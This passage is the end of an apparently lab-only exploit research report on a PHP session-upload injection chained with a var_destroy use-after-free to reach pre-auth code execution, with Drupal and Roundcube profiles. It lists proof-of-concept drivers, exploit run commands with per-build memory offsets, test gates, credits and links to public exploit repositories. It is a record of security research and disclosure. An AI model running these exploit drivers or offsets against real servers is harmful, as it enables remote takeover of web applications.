- a deterministic in-band carrier leak on 8.5.12/x86-64 (GH-22554 is fixed on
  8.5.12);
- FPM delivery with request buffering disabled;
- 150-worker scale and FPM variants;
- a validated detection rule for the serialized shape.

---

## 14. Reproduction file map

### 14.1 Labs and harnesses

| Path | Purpose | Ports / containers |
|---|---|---|
| `lab-115560/` | main harness: direct, no-upload control, nofunc, race, workers, amd64 | `:18200`–`:18209` |
| `lab-115560/webroot/index.php` | consumer: switches to `php`, `CachePurge` dtor, `m=0/1/2/4/5` modes | — |
| `lab-115560/webroot/prime.php` | writes one dummy progress record without `session_start()` | — |
| `lab-115560/webroot/seed.php` | persistent first record for `cleanup=On` | — |
| `lab-115560/webroot/noswitch.php` | no runtime handler switch (control) | — |
| `lab-115560/webroot/scan_prefix.php` | raw-input-buffer vs string-copy scanner | — |
| `lab-115560/webroot/worker_id.php` | PID oracle for pinning | — |
| `lab-115560/measure_amd64.py` | x86-64-aware `/proc` measure | `:18207` |
| `lab-115560/fire_pinned.py` | chain inside `WorkerPinner` | `:18206` |
| `lab-drupal/` | Drupal 11.4.11 P5 harness, `vd.php`, `vd_nopreload.php`, `vd_seed.php`, race compose | `:18300`–`:18302` |
| `lab-roundcube/` | Roundcube 1.6.11 harness, `vd115560` plugin, `prime.php`, evidence logs | `:18310`–`:18311` |
| `lab-asan-85x/` | ASAN image for the UAF trace | — |

### 14.2 Drivers and verification

| Path | Purpose |
|---|---|
| `poc/verify_115560_vardestroy.py` | direct measure/fire/brute driver |
| `poc/verify_115560_race.py` | streaming-upload + concurrent-consumer race |
| `poc/verify_115560_wakeup.py` | `__wakeup`/`__unserialize` negative matrix |
| `poc/verify_115560_drupal.py` | Drupal P5 direct/race/controls |
| `poc/verify_115560_roundcube.py` | Roundcube simple/prime/terminal/controls |
| `poc/verify_vardestroy_postcarrier.py` | shared payload builder (`build_value`, `force_fail`) |
| `poc/verify_var_destroy_uaf.php` | minimal ASAN reproducer |
| `poc/verify_var_destroy_spray.php` | reclaim / wild-pointer demo |
| `poc/verify_vardestroy_rce.py` | earlier carrier ladder (different lab) |
| `poc/verify_worker_pinning.py` | N−1 holder pinning primitive |
| `php2shell/` | maps, pinning, profiles, offsets, build/gadget tooling |

### 14.3 Documentation (evidence pointers)

`docs/PHASE0_115560_FREEZE.md`, `docs/PHASE1_2_115560_RESULTS.md`,
`docs/PLAN_115560.md`, `docs/RACE_WAKEUP_115560.md`,
`docs/NOFUNC_115560.md`, `docs/WORKERS_115560.md`,
`docs/X86_64_115560.md`, `docs/VAR_DESTROY_UAF.md`,
`docs/DRUPAL_115560.md`, `docs/DRUPAL_AUTOLOAD_PROBE.md`,
`docs/ROUNDCUBE_115560.md`, `docs/GADGET_SURVEY_115560.md`,
`docs/DEFENSE_115560.md`, `docs/NOVELTY_115560_2026-10-31.md`,
`.opencode/plan/115560-next-phase.md`.

### 14.4 Bring-up and run

```bash
# main lab (direct + control)
cd lab-115560 && docker compose up -d && cd ..

python3 poc/verify_115560_vardestroy.py \
  --target 127.0.0.1:18200 --container php2shell-115560-8427 \
  --build 8.4.27 run
python3 poc/verify_115560_vardestroy.py \
  --target 127.0.0.1:18201 --container php2shell-115560-8512 \
  --build 8.5.12 run

# hardened target
docker compose -f lab-115560/docker-compose.nofunc.yml up -d
python3 poc/verify_115560_vardestroy.py \
  --target 127.0.0.1:18203 --container php2shell-115560-8427-nofunc \
  --build 8.4.27 run

# cleanup=On race
docker compose -p php2shell-115560-race \
  -f lab-115560/docker-compose.race.yml up -d
python3 poc/verify_115560_race.py \
  --target 127.0.0.1:18204 --container php2shell-115560-8427-race \
  --build 8.4.27 --settle 0.7 --attempts 3 run

# no-/proc window (arm64)
python3 poc/verify_115560_vardestroy.py \
  --target 127.0.0.1:18200 --container php2shell-115560-8427 --build 8.4.27 \
  --brute --delta 0x6c019 --lib-delta 0x2130000 --zif-off 0x431510 --fire-mode 4

# Drupal
python3 poc/verify_115560_drupal.py \
  --target 127.0.0.1:18300 --container php2shell-115560-drupal-8427 \
  --build 8.4.27 run

# Roundcube
python3 poc/verify_115560_roundcube.py \
  --target 127.0.0.1:18310 --container php2shell-rc-8427 --build 8.4.27 run
```

### 14.5 Acceptance and gates

| Gate | Condition | Result |
|---|---|---|
| G0 | four positives + all controls negative | PASS (`docs/PHASE0_115560_FREEZE.md`) |
| G1 | Drupal P5 UAF + terminal through 115560 | PASS on 8.4.27/8.5.12; race PASS on 8.4.27 |
| G2 | Roundcube plugin path + terminal | PASS for plugin-assisted; stock db/redis blocker documented |
| G4 | novelty + publication decision | novelty resolved (composition public); publication decision recorded in `docs/RESPONSIBLE_PUBLICATION.md` |

`scripts/check.sh` is the offline consistency gate; it does not prove a claim.
Generated artifacts (`docs/DIFF_*.md`, `reports/gadgets/*`,
`reports/build-diff/*`) must be regenerated, never hand-edited.

---

## 15. Credits

This report is a consolidation of lab work in
this repository and the public research it builds on.
The 115560 delivery, the cleanup race, the `var_destroy` UAF, and the forged
`zif_system` terminal are **not ours**; credit belongs to the authors below.

**Public prior art (in order of dependence):**

- **ACD421/PHP** — the four-stage composition (`weapons/lab/fa_jammy.sh`,
  2026-10-26), the 115560-class injection and stock `cleanup=1` slow-upload race
  (`zero1`, 2026-10-21), and the `dtor_obj = zif_system` terminal
  (`zero4`/`zero5`, 2026-10-21/24).
- **B63** (`basesixtythree`) and **googlesky** — public 115560 pre-auth
  simple-gadget PoCs (2026-10-23/24); **junaire** — reported 115560 work
  (URL unverified).
- **dinosn** (2026-05-02) and **Calif / MADBugs** (2026-05-01) — the underlying
  `var_destroy` re-entry UAF.
- **mnk-works** (Chain B), **TheCyberGeek**, and **Qi Deng / ikow** — var_destroy
  escalation work, including the `disable_functions` property.
- **9bie** (EDB 52704), **devploit**, and **umair-aziz025** — pre-auth
  `zif_system` and worker-pinning techniques for the 109618/109619 class.
- **Roundcube** CVE-2025-49113 and CVE-2026-114724 authors/advisories for the
  application context.

**This repo's contribution:** the patched-build (8.4.27/8.5.12) pre-auth
end-to-end result, the default `cleanup=On` race combined with the var_destroy
terminal, the arm64 no-`/proc` measured window, the raw-session-input-buffer
carrier and per-build constants, the Drupal P5 and Roundcube plugin profiles,
the negative `__wakeup`/`__unserialize` matrix, and the controls.

No external send, publication, or vendor contact was made in producing this
report.

---

## 16. References

**PHP internals**

- `var_destroy()` / delayed flags (8.4.27):
  <https://github.com/php/php-src/blob/PHP-8.4.27/ext/standard/var_unserializer.re#L245-L325>
- lock/fresh branch (8.4.27):
  <https://github.com/php/php-src/blob/PHP-8.4.27/ext/standard/var_unserializer.re#L65-L87>
- 8.2.34 equivalent:
  <https://github.com/php/php-src/blob/PHP-8.2.34/ext/standard/var_unserializer.re#L255-L301>
- 8.5.12 equivalent:
  <https://github.com/php/php-src/blob/PHP-8.5.12/ext/standard/var_unserializer.re#L265-L311>

**Advisory / 115560**

- PHP archive, 2026-10-23: <https://www.php.net/archive/2026.php>
- mitigation note: <https://safeguard.sh/resources/blog/php-cve-2026-115560-session-upload-progress-mitigation>
- session config: <https://www.php.net/manual/en/session.configuration.php#ini.session.serialize-handler>

**Public prior art**

- ACD421/PHP: <https://github.com/ACD421/PHP> —
  `weapons/lab/fa_jammy.sh`,
  `zero1_session_gaps/WRITEUP.md`,
  `zero4_var_destroy_uaf/WRITEUP.md`,
  `zero5_serialize_reentry/WRITEUP.md`,
  `zero10_slow_bleed/SLOW_BLEED.md`
- B63: <https://github.com/basesixtythree/B63-POC-CVE-2026-115560>
- googlesky: <https://github.com/googlesky/CVE-2026-115560>
- dinosn: <https://github.com/dinosn/php-8.5.5-var_destroy-uaf>
- Calif: <https://blog.calif.io/p/mad-bugs-finding-and-exploiting-a>
- mnk-works: <https://github.com/mnk-works/php2shell-verify>
- TheCyberGeek: <https://github.com/TheCyberGeek/php2shell-research>
- Qi Deng / ikow: <https://github.com/ikow/php2shell-poc>
- 9bie: <https://github.com/9bie/php2shell-bypass-aslr-exp>
- devploit: <https://github.com/devploit/php2shell>
- umair-aziz025: <https://github.com/umair-aziz025/PHP2Shell>
- Roundcube CVE-2025-49113: <https://nvd.nist.gov/vuln/detail/CVE-2025-49113>

**Application sources**

- Drupal P5:
  <https://github.com/drupal/drupal/blob/11.x/core/lib/Drupal/Core/Discovery/YamlCacheCollectorDiscovery.php#L64>,
  <https://github.com/drupal/drupal/blob/11.x/core/lib/Drupal/Core/Menu/MenuActiveTrail.php#L81>,
  <https://github.com/drupal/drupal/blob/11.x/core/lib/Drupal/Core/Cache/MemoryBackend.php#L89-L99>
- Roundcube session handler:
  <https://github.com/roundcube/roundcubemail/blob/master/program/lib/Roundcube/rcube_session.php#L100-L115>
- Roundcube startup order:
  <https://github.com/roundcube/roundcubemail/blob/master/program/include/rcmail.php#L100-L120>
- CakePHP 5 session:
  <https://github.com/cakephp/cakephp/blob/5.x/src/Http/Session.php#L150-L180>

---

*End of report. LAB-ONLY. The local full-documentation decision
(`docs/PUBLICATION_DECISION_115560.md`) does not authorize an external send;
see §12 and `docs/NOVELTY_115560_2026-10-31.md` §6 for the options and the
send checklist.*







